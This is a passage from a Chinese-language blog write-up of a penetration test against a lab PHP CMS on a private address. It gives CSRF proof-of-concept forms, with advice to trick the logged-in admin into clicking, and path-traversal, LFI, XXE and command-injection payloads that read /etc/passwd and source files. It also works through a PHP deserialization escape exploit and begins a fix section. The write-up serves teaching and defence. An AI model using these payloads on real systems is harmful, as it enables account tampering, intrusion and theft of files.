+  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.164.147/member/member/edit.html?id=1&amp;dialog=1&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;szy&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;szy&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mobile&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;17856276754&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;263233<span class="hljs-symbol">&amp;#64;</span>qq<span class="hljs-symbol">&amp;#46;</span>com&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;groupid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;5&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;point&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vip&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;overduedate&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1970<span class="hljs-symbol">&amp;#45;</span>01<span class="hljs-symbol">&amp;#45;</span>01<span class="hljs-symbol">&amp;#32;</span>08<span class="hljs-symbol">&amp;#58;</span>00<span class="hljs-symbol">&amp;#58;</span>00&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div>
+
+
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162711313.png" srcset="/img/loading.gif" alt="image-20210323162711313" style="zoom:50%;">
+
+<p>复制上面的链接，使用社工的方法发送给admin，如果他在处于登录状态时点击那么攻击就成功了。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406161709510.png" srcset="/img/loading.gif" alt="image-20210406161709510"></p>
+<p>点击<code>Submit request</code>，就会出现更新成功的提示。查看<code>szy</code>，确认其等级变化</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323163057847.png" srcset="/img/loading.gif" alt="image-20210323163057847" style="zoom: 50%;">
+
+<p>可以看到该用户的等级已经变成了高级会员，并且积分点数也变成了1000，漏洞利用成功。</p>
+<h3 id="漏洞点三-2"><a href="#漏洞点三-2" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>同样是在这个页面，有一个”添加”页面，同样也是存在CSRF漏洞，如果被攻击者利用，则可以创造出大量的无用账号，从而浪费服务器的资源，可能造成dos攻击。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408153639002.png" srcset="/img/loading.gif" alt="image-20210408153639002" style="zoom: 33%;">
+
+
+
+<h3 id="漏洞点四-1"><a href="#漏洞点四-1" class="headerlink" title="漏洞点四"></a>漏洞点四</h3><p>内容-&gt;稿件管理-&gt;通过审核，这里会显示所有用户提交的稿件，但是如果攻击者提交了一个含有恶意代码的稿件，又想在admin不知情的情况下让这个稿件通过审核，此时就可以创建一个恶意链接发送给admin，</p>
+<p>内容如下</p>
+<div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.164.147/cms/publish/pass.html&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ids<span class="hljs-symbol">&amp;#91;</span><span class="hljs-symbol">&amp;#93;</span>&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;4&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div>
+
+<p>当admin点击后，就会让稿件通过审核</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419224904297.png" srcset="/img/loading.gif" alt="image-20210419224904297" style="zoom: 33%;">
+
+
+
+<h2 id="11-任意文件下载"><a href="#11-任意文件下载" class="headerlink" title="11.任意文件下载"></a>11.任意文件下载</h2><p>首页中存在一个图片下载模块，可以下载自己喜欢的球星壁纸</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144023954.png" srcset="/img/loading.gif" alt="image-20210428144023954" style="zoom:50%;">
+
+<p>但是我们可以拦截请求，修改提交的数据</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144326701.png" srcset="/img/loading.gif" alt="image-20210428144326701"></p>
+<p>尝试下载<code>/etc/passwd</code>文件，输入</p>
+<div class="hljs"><pre><code class="hljs arcade">filename=<span class="hljs-regexp">/etc/</span>passwd</code></pre></div>
+
+<p>但是出现提示<code>文件不存在！</code></p>
+<p>尝试多输入几个<code>../</code></p>
+<div class="hljs"><pre><code class="hljs awk">filename=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd</code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144637060.png" srcset="/img/loading.gif" alt="image-20210428144637060" style="zoom:50%;">
+
+<p>成功获取到<code>/etc/passwd</code>文件内容</p>
+<p>那么就可以结合RCE漏洞，获取到该服务器上的任意文件</p>
+<p>首先利用RCE漏洞获取到文件的完整路径，之后配合该漏洞即可实现任意文件下载。</p>
+<h2 id="12-unserialize"><a href="#12-unserialize" class="headerlink" title="12.unserialize"></a>12.unserialize</h2><p>该漏洞就是一个CTF题目，但是源码需要利用前面的漏洞获取</p>
+<p>链接:<a target="_blank" rel="noopener" href="http://192.168.164.147/ctf/index">http://192.168.164.147/ctf/index</a></p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323164427572.png" srcset="/img/loading.gif" alt="image-20210323164427572" style="zoom:67%;">
+
+<p>根据提示是一个ctf题目，那么应该也符合一般ctf中web题目的套路。</p>
+<p>首先查看源码 ，获取提示</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323164641331.png" srcset="/img/loading.gif" alt="image-20210323164641331"></p>
+<p>但是一般的反序列化漏洞的题目都是有源码的，只有根据源码才能写出EXP。</p>
+<p>既然没有源码，我们就需要使用之前发现的漏洞获取源码。</p>
+<p>有五种获取源码的方法</p>
+<ul>
+<li><p>文件上传</p>
+<p>上传一句话木马后，可以控制服务器，可以直接到网站根目录中下载文件</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171248434.png" srcset="/img/loading.gif" alt="image-20210323171248434"></p>
+</li>
+<li><p>LFI</p>
+<p>使用<code>php://filter</code>，在文件包含漏洞的位置获取base64源码</p>
+<p>payload：</p>
+<div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">164.147</span>:<span class="hljs-number">81</span><span class="hljs-regexp">/contact/i</span>ndex?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=unserialize.php</code></pre></div>
+
+
+
+</li>
+</ul>
+<p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171514268.png" srcset="/img/loading.gif" alt="image-20210323171514268"></p>
+<ul>
+<li><p>XXE</p>
+<p>利用文件上传获取的路劲</p>
+<p>payload</p>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
+<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY f <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///var/www/public/unserialize.php&quot;</span>&gt;</span></span>
+<span class="hljs-meta">]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">info</span>&gt;</span>das<span class="hljs-tag">&lt;/<span class="hljs-name">info</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>
+</li>
+<li><p>任意文件下载</p>
+<p>点击即可下载到文件</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414195346355.png" srcset="/img/loading.gif" alt="image-20210414195346355"></p>
+</li>
+<li><p>RCE</p>
+<p>首先 列出目录</p>
+<div class="hljs"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span> | ls</code></pre></div>
+
+<p>读取文件</p>
+<div class="hljs"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span> | cat unserialize.php</code></pre></div>
+
+
+
+</li>
+</ul>
+<p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171610197.png" srcset="/img/loading.gif" alt="image-20210323171610197"></p>
+<p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171742181.png" srcset="/img/loading.gif" alt="image-20210323171742181"></p>
+<p>  源码如下</p>
+  <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;
+        <span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)
+        &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;flag&#123;xxxxxx&#125;&#x27;)&lt;/script&gt;&quot;</span>;
+        &#125;
+        <span class="hljs-keyword">else</span>
+        &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;继续加油&#x27;)&lt;/script&gt;&quot;</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
+&#125;
+<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];
+<span class="hljs-variable">$password</span>=<span class="hljs-number">1</span>;
+<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
+<span class="hljs-variable">$test</span>=unserialize(<span class="hljs-variable">$ser</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+<p>开始解题</p>
+<p><strong>考察点是反序列化字符逃逸</strong></p>
+<p>先从简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
+&#125;
+<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();
+<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));
+
+<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>利用反序列化逃逸修改pass的值。</p>
+<p>正常的序列化结果</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre></div>
+
+<p><code>s:4:&quot;aaaa&quot;</code>s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。</p>
+<p>例如</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre></div>
+
+<p>将4改为5，那么则认为name的值为 <code>aaaa&quot;</code>,此时因为前面的”无法闭合而导致反序列化失败。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/Ctefk8iKXP34Gmn.png" srcset="/img/loading.gif" alt="error.png"></p>
+<p>而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。</p>
+<p>例如想将pass变量的序列化字符串如下</p>
+<div class="hljs"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;</code></pre></div>
+
+<p>其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志</p>
+<p>上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
+&#125;
+<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();
+var_dump(serialize(<span class="hljs-variable">$AA</span>));
+<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));
+var_dump(<span class="hljs-variable">$res</span>);
+<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;
+<span class="hljs-comment">//echo unserialize($AA);</span>
+<span class="hljs-comment">//&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</span>
+<span class="hljs-meta">?&gt;</span>
+<span class="hljs-comment">//结果如下   ||为对齐</span>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;||</span>
+<span class="hljs-comment">string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span>
+<span class="hljs-comment">hacker</span>
+<span class="hljs-comment">*/</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" srcset="/img/loading.gif" alt="success.png"></p>
+<p>这里pass的值就被该称了hacker</p>
+<p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
+<p>而针对这道题，代码的意思大致为，POST提交一个uanme，password默认为1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是</p>
+<p>需要构造的属性</p>
+<div class="hljs"><pre><code class="hljs vim"><span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;;s:4:&quot;</span>password<span class="hljs-string">&quot;;s:4:&quot;</span>easy<span class="hljs-comment">&quot;;&#125;) =29</span></code></pre></div>
+
+<p>可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。</p>
+<div class="hljs"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre></div>
+
+<p>上面构造出的payload长度为48因此还需要12个challenge。</p>
+<p><strong>exp如下</strong></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;1&quot;</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
+&#125;
+<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
+<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$ser</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>输出的结果：</p>
+<div class="hljs"><pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;uname&quot;</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;
+
+<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为156</span></code></pre></div>
+
+<p><strong>finalpayload</strong>：</p>
+<div class="hljs"><pre><code class="hljs css">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre></div>
+
+<p>提交payload，获取flag</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323194642093.png" srcset="/img/loading.gif" alt="image-20210323194642093"></p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="1-RFI-1"><a href="#1-RFI-1" class="headerlink" title="1.RFI"></a>1.RFI</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\employee\controller\Index.php</code></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
+        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) || <span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
+            <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;info.php&#x27;</span>;
+        &#125;
+	<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>&quot;</span>;
+    <span class="hljs-variable">$info</span> = [];
+    <span class="hljs-variable">$info</span> = <span class="hljs-variable">$info_1</span>;
+
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;info&#x27;</span> =&gt; <span class="hljs-variable">$info</span>]);
+    <span class="hljs-keyword">return</span> view();
+    &#125;</code></pre></div>
+
+<p>这个代码很简单，就是包含了<code>info.php</code>文件按，并获取其中的$info参数，然后发送给前端，然后在前端显示内容。但是也很危险，因为有include函数的存在，所以存在RFI，而且对提交的参数没有任何的检查和过滤，很容易被攻击者利用</p>
+<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
+<li><p><strong>方法一</strong></p>
+<p>修改php.ini文件，在其中添加</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_open</span> = <span class="hljs-literal">off</span>
+<span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">off</span></code></pre></div>
+
+<p>构成RFI漏洞的条件十分苛刻，只有php.ini中上面两个配置项都没off才能利用该漏洞。</p>
